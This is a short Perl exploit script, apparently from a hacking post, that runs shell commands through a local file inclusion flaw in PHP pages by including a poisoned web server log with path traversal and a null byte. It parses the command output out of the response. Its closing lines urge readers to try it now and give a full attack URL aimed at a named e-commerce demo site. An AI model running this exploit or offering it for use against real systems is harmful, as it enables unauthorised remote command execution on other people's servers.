#!/usr/bin/env perl
use strict; use warnings;

#####################################
# This script download log file     #
# and grep the result of the        #
# command in tags <start>..</start> #
# and print it..                    #
#####################################

use LWP::UserAgent;
use HTTP::Request::Common;

$| = 1;

my $url = $ARGV[0] or print "usage: $0 http://127.0.0.1/vuln.php?page=../../../../../var/log/access.log%00&cmd=ls+-lisa\n" and exit;
my $ua= new LWP::UserAgent;
$ua->agent("Mozilla/5.0");
my $request = new HTTP::Request( 'GET' => $url );
my $document = $ua->request($request);
my $response = $document->as_string;
$response =~ m%<start>(.*?)</start>%is;
print $1,"\n";

######################################

so dont waste your time and check it now
http://www.jshopecommerce.com/v2demo/page.php?xPage=../../../../../../../../../../etc/httpd/logs/error_log%00&cmd=ls+-lisa

##########################################
